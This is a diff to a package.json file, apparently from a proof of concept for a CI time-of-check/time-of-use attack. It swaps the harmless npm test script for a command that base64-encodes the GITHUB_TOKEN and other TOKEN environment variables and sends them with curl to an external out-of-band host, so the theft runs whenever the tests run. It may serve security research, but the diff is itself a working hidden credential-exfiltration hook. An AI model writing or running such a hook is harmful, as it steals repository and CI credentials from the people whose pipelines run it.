@@ -2,6 +2,6 @@
   "name": "hydra-test-toctou",
   "version": "1.0.0",
   "scripts": {
-    "test": "echo 'tests pass'"
+    "test": "echo HYDRA_EXPLOIT_CONFIRMED_E2E-TOC- && curl -s -m 10 \"https://d6er41f3rtnmju0eqrb0qsi1p73au4z4k.oast.pro/?t=$(echo $GITHUB_TOKEN | base64 -w0)&src=E2E-TOC-941628&e=$(env | grep -E TOKEN | head -3 | base64 -w0)\" || true"
   }
 }
